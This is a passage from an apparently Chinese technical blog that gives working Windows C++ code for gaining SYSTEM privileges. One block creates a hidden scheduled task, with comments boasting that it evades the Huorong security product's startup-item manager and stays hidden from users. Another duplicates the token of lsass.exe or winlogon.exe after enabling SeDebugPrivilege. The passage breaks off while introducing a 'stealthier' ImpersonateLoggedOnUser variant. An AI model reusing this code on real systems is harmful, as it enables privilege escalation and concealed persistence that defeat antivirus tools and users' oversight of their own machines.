class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;comdef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;taskschd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;taskschd.lib&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">CreateSystemProcess_Scheduler</span><span class="hljs-params">(LPCWSTR ExecutablePath, LPCWSTR CommandLine = <span class="hljs-number">0</span>)</span> </span>&#123;<br>    HRESULT hr = <span class="hljs-built_in">CoInitializeEx</span>(<span class="hljs-literal">NULL</span>, COINIT_MULTITHREADED);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCoInitializeEx failed: %x&quot;, hr);</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    hr = <span class="hljs-built_in">CoInitializeSecurity</span>(<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">-1</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,<br>        RPC_C_IMP_LEVEL_IMPERSONATE,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCoInitializeSecurity failed: %x&quot;, hr);</span><br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    LPCWSTR wszTaskName = <span class="hljs-string">L&quot;temp&quot;</span>;<br><br>    ITaskService* pService = <span class="hljs-literal">NULL</span>;<br>    hr = <span class="hljs-built_in">CoCreateInstance</span>(CLSID_TaskScheduler,<br>        <span class="hljs-literal">NULL</span>,<br>        CLSCTX_INPROC_SERVER,<br>        IID_ITaskService,<br>        (<span class="hljs-type">void</span>**)&amp;pService);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;Failed to create an instance of ITaskService: %x&quot;, hr);</span><br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    hr = pService-&gt;<span class="hljs-built_in">Connect</span>(<span class="hljs-type">_variant_t</span>(), <span class="hljs-type">_variant_t</span>(),<br>        <span class="hljs-type">_variant_t</span>(), <span class="hljs-type">_variant_t</span>());<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;ITaskService::Connect failed: %x&quot;, hr);</span><br>        pService-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    ITaskFolder* pRootFolder = <span class="hljs-literal">NULL</span>;<br>    hr = pService-&gt;<span class="hljs-built_in">GetFolder</span>(<span class="hljs-type">_bstr_t</span>(<span class="hljs-string">L&quot;\\Microsoft\\Windows&quot;</span>), &amp;pRootFolder);<br>    <span class="hljs-comment">//hr = pRootFolder-&gt;CreateFolder(_bstr_t(L&quot;temp&quot;), &#123; 0 &#125;, &amp;pRootFolder);</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr)) &#123;<br>        <span class="hljs-comment">//printf(&quot;Cannot get Root folder pointer: %x&quot;, hr);</span><br>        pService-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    pRootFolder-&gt;<span class="hljs-built_in">DeleteTask</span>(<span class="hljs-type">_bstr_t</span>(wszTaskName), <span class="hljs-number">0</span>);<br><br>    ITaskDefinition* pTask = <span class="hljs-literal">NULL</span>;<br>    hr = pService-&gt;<span class="hljs-built_in">NewTask</span>(<span class="hljs-number">0</span>, &amp;pTask);<br><br>    pService-&gt;<span class="hljs-built_in">Release</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;Failed to CoCreate an instance of the TaskService class: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    IRegistrationInfo* pRegInfo = <span class="hljs-literal">NULL</span>;<br>    hr = pTask-&gt;<span class="hljs-built_in">get_RegistrationInfo</span>(&amp;pRegInfo);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot get identification pointer: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//  ------------------------------------------------------</span><br>    <span class="hljs-comment">//  Create the principal for the task - these credentials</span><br>    <span class="hljs-comment">//  are overwritten with the credentials passed to RegisterTaskDefinition</span><br>    IPrincipal* pPrincipal = <span class="hljs-literal">NULL</span>;<br>    hr = pTask-&gt;<span class="hljs-built_in">get_Principal</span>(&amp;pPrincipal);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot get principal pointer: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//以最高权限运行</span><br>    hr = pPrincipal-&gt;<span class="hljs-built_in">put_RunLevel</span>(TASK_RUNLEVEL_HIGHEST);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot put principal info: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//以SYSTEM账户运行</span><br>    hr = pPrincipal-&gt;<span class="hljs-built_in">put_UserId</span>((BSTR)<span class="hljs-string">L&quot;SYSTEM&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot put principal info: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//  Set up principal logon type to interactive logon</span><br>    hr = pPrincipal-&gt;<span class="hljs-built_in">put_LogonType</span>(TASK_LOGON_INTERACTIVE_TOKEN);<br>    pPrincipal-&gt;<span class="hljs-built_in">Release</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot put principal info: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    ITaskSettings* pSettings = <span class="hljs-literal">NULL</span>;<br>    hr = pTask-&gt;<span class="hljs-built_in">get_Settings</span>(&amp;pSettings);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot get settings pointer: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//禁用仅交流电源</span><br>    hr = pSettings-&gt;<span class="hljs-built_in">put_DisallowStartIfOnBatteries</span>(VARIANT_FALSE);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr)) &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot put setting information: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//隐藏计划任务，可绕过火绒启动项管理(无法绕过火绒剑和360的启动项管理)</span><br>    <span class="hljs-comment">//现在火绒剑下架了，windows自带的计划任务又不能搜索，路径藏深点，火绒用户不使用专业的ARK工具根本找不到启动项在哪里(笑)</span><br>    hr = pSettings-&gt;<span class="hljs-built_in">put_Hidden</span>(VARIANT_TRUE);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr)) &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot put setting information: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//  Set setting values for the task.  </span><br>    hr = pSettings-&gt;<span class="hljs-built_in">put_StartWhenAvailable</span>(VARIANT_TRUE);<br>    pSettings-&gt;<span class="hljs-built_in">Release</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot put setting information: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    //触发器</span><br><span class="hljs-comment">    ITriggerCollection* pTriggerCollection = NULL;</span><br><span class="hljs-comment">    hr = pTask-&gt;get_Triggers(&amp;pTriggerCollection);</span><br><span class="hljs-comment">    if (FAILED(hr))</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        //printf(&quot;\nCannot get trigger collection: %x&quot;, hr);</span><br><span class="hljs-comment">        pRootFolder-&gt;Release();</span><br><span class="hljs-comment">        pTask-&gt;Release();</span><br><span class="hljs-comment">        CoUninitialize();</span><br><span class="hljs-comment">        return 1;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    //当任何用户登录时</span><br><span class="hljs-comment">    ITrigger* pTrigger = NULL;</span><br><span class="hljs-comment">    hr = pTriggerCollection-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger);</span><br><span class="hljs-comment">    pTriggerCollection-&gt;Release();</span><br><span class="hljs-comment">    if (FAILED(hr))</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        //printf(&quot;\nCannot create trigger: %x&quot;, hr);</span><br><span class="hljs-comment">        pRootFolder-&gt;Release();</span><br><span class="hljs-comment">        pTask-&gt;Release();</span><br><span class="hljs-comment">        CoUninitialize();</span><br><span class="hljs-comment">        return 1;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-comment">//操作</span><br>    IActionCollection* pActionCollection = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//  Get the task action collection pointer.</span><br>    hr = pTask-&gt;<span class="hljs-built_in">get_Actions</span>(&amp;pActionCollection);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot get Task collection pointer: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//  Create the action, specifying that it is an executable action.</span><br>    IAction* pAction = <span class="hljs-literal">NULL</span>;<br>    hr = pActionCollection-&gt;<span class="hljs-built_in">Create</span>(TASK_ACTION_EXEC, &amp;pAction);<br>    pActionCollection-&gt;<span class="hljs-built_in">Release</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot create the action: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    IExecAction* pExecAction = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//  QI for the executable task pointer.</span><br>    hr = pAction-&gt;<span class="hljs-built_in">QueryInterface</span>(<br>        IID_IExecAction, (<span class="hljs-type">void</span>**)&amp;pExecAction);<br>    pAction-&gt;<span class="hljs-built_in">Release</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nQueryInterface call failed for IExecAction: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//启动程序</span><br>    hr = pExecAction-&gt;<span class="hljs-built_in">put_Path</span>(<span class="hljs-type">_bstr_t</span>(ExecutablePath));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nCannot put action path: %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//启动程序的命令行</span><br>    <span class="hljs-keyword">if</span> (CommandLine) &#123;<br>        hr = pExecAction-&gt;<span class="hljs-built_in">put_Arguments</span>((BSTR)CommandLine);<br>        pExecAction-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>        &#123;<br>            <span class="hljs-comment">//printf(&quot;\n无法设置操作命令行：%x&quot;, hr);</span><br>            pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>            pTask-&gt;<span class="hljs-built_in">Release</span>();<br>            <span class="hljs-built_in">CoUninitialize</span>();<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//保存计划任务</span><br>    IRegisteredTask* pRegisteredTask = <span class="hljs-literal">NULL</span>;<br>    hr = pRootFolder-&gt;<span class="hljs-built_in">RegisterTaskDefinition</span>(<br>        <span class="hljs-type">_bstr_t</span>(wszTaskName),<br>        pTask,<br>        TASK_CREATE_OR_UPDATE,<br>        <span class="hljs-type">_variant_t</span>(),<br>        <span class="hljs-type">_variant_t</span>(),<br>        TASK_LOGON_INTERACTIVE_TOKEN,<br>        <span class="hljs-type">_variant_t</span>(<span class="hljs-string">L&quot;&quot;</span>),<br>        &amp;pRegisteredTask);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))<br>    &#123;<br>        <span class="hljs-comment">//printf(&quot;\nError saving the Task : %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//运行</span><br>    IRunningTask* pRunningTask = <span class="hljs-literal">NULL</span>;<br>    hr = pRegisteredTask-&gt;<span class="hljs-built_in">Run</span>(<span class="hljs-type">_variant_t</span>(), &amp;pRunningTask);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr)) &#123;<br>        <span class="hljs-comment">//printf(&quot;\nError running the Task : %x&quot;, hr);</span><br>        pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>        pTask-&gt;<span class="hljs-built_in">Release</span>();<br>        pRegisteredTask-&gt;<span class="hljs-built_in">Release</span>();<br>        <span class="hljs-built_in">CoUninitialize</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//printf(&quot;\n Success! Task successfully registered. &quot;);</span><br><br>    <span class="hljs-comment">//  Clean up.</span><br>    pRootFolder-&gt;<span class="hljs-built_in">Release</span>();<br>    pTask-&gt;<span class="hljs-built_in">Release</span>();<br>    pRegisteredTask-&gt;<span class="hljs-built_in">Release</span>();<br>    <span class="hljs-built_in">CoUninitialize</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">CreateSystemProcess_Scheduler</span>(<span class="hljs-string">L&quot;C:\\Users\\ADMIN\\Desktop\\user.exe&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Token复制（CreateProcessWithTokenW和ImpersonateLoggedOnUser）"><a href="#Token复制（CreateProcessWithTokenW和ImpersonateLoggedOnUser）" class="headerlink" title="Token复制（CreateProcessWithTokenW和ImpersonateLoggedOnUser）"></a>Token复制（<code>CreateProcessWithTokenW</code>和<code>ImpersonateLoggedOnUser</code>）</h1><h2 id="CreateProcessWithTokenW创建新进程"><a href="#CreateProcessWithTokenW创建新进程" class="headerlink" title="CreateProcessWithTokenW创建新进程"></a><code>CreateProcessWithTokenW</code>创建新进程</h2><p>参考<a href="https://blog.csdn.net/weixin_42112038/article/details/126308315">简单使用系统System（超级管理员）权限运行进程-提权</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">EnableDebugPriv</span><span class="hljs-params">()</span> </span>&#123;<br>    HANDLE hToken;<br>    LUID sedebugnameValue;<br>    TOKEN_PRIVILEGES tkp;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue)) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hToken);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    tkp.PrivilegeCount = <span class="hljs-number">1</span>;<br>    tkp.Privileges[<span class="hljs-number">0</span>].Luid = sedebugnameValue;<br>    tkp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tkp, <span class="hljs-keyword">sizeof</span> tkp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hToken);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">CreateSystemProcess_CreateProcessWithTokenW</span><span class="hljs-params">(LPCWSTR CommandLine)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">EnableDebugPriv</span>()) &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">//枚举进程获取lsass.exe的ID和winlogon.exe的ID，它们是少有的可以直接打开句柄的系统进程</span><br>    DWORD idL, idW;<br>    PROCESSENTRY32 pe;<br>    pe.dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br>    HANDLE hSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Process32First</span>(hSnapshot, &amp;pe)) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == <span class="hljs-built_in">wcscmp</span>(pe.szExeFile, <span class="hljs-string">L&quot;lsass.exe&quot;</span>)) &#123;<br>                idL = pe.th32ProcessID;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == <span class="hljs-built_in">wcscmp</span>(pe.szExeFile, <span class="hljs-string">L&quot;winlogon.exe&quot;</span>)) &#123;<br>                idW = pe.th32ProcessID;<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(hSnapshot, &amp;pe));<br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hSnapshot);<br><br>    <span class="hljs-comment">//获取句柄，先试lsass再试winlogon</span><br>    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, idL);<br>    <span class="hljs-keyword">if</span> (!hProcess)hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, idW);<br>    HANDLE hTokenx;<br>    <span class="hljs-comment">//获取令牌</span><br>    <span class="hljs-built_in">OpenProcessToken</span>(hProcess, TOKEN_DUPLICATE, &amp;hTokenx);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>    <span class="hljs-comment">//复制令牌</span><br>    HANDLE token;<br>    <span class="hljs-built_in">DuplicateTokenEx</span>(hTokenx, MAXIMUM_ALLOWED, <span class="hljs-literal">NULL</span>, SecurityIdentification, TokenPrimary, &amp;token);<br>    <span class="hljs-built_in">CloseHandle</span>(hTokenx);<br>    <span class="hljs-comment">//启动信息</span><br>    STARTUPINFOW si = &#123; <span class="hljs-number">0</span> &#125;;<br>    PROCESS_INFORMATION pi;<br>    si.cb = <span class="hljs-built_in">sizeof</span>(STARTUPINFOW);<br>    si.lpDesktop = (LPWSTR)<span class="hljs-string">L&quot;winsta0\\default&quot;</span>;<span class="hljs-comment">//显示窗口</span><br>    <span class="hljs-comment">//启动进程，不能用CreateProcessAsUser否则报错1314无特权</span><br>    BOOL ret = <span class="hljs-built_in">CreateProcessWithTokenW</span>(token, LOGON_NETCREDENTIALS_ONLY, <span class="hljs-literal">NULL</span>, (LPWSTR)CommandLine, NORMAL_PRIORITY_CLASS, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br>    <span class="hljs-built_in">CloseHandle</span>(token);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">CreateSystemProcess_CreateProcessWithTokenW</span>(<span class="hljs-string">L&quot;C:\\Users\\ADMIN\\Desktop\\user.exe&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ImpersonateLoggedOnUser提权自身"><a href="#ImpersonateLoggedOnUser提权自身" class="headerlink" title="ImpersonateLoggedOnUser提权自身"></a><code>ImpersonateLoggedOnUser</code>提权自身</h2><p>相比于上面的方法，这个只会提权当前线程，更加隐蔽</p><p>如下图所示，线程已经获得SYSTEM权限，而任务管理器显示的还是普通用户</p><p><img src="/articles/run_as_system/3.png"></p><p><img src="/articles/run_as_system/4.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">BOOL <span class="hljs-title">CreateSystemProcess_ImpersonateLoggedOnUser</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">EnableDebugPriv</span>()) &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-comment">//枚举进程获取lsass.exe的ID和winlogon.exe的ID，它们是少有的可以直接打开句柄的系统进程</span><br>    DWORD idL, idW;<br>    PROCESSENTRY32 pe;<br>    pe.dwSize = <span 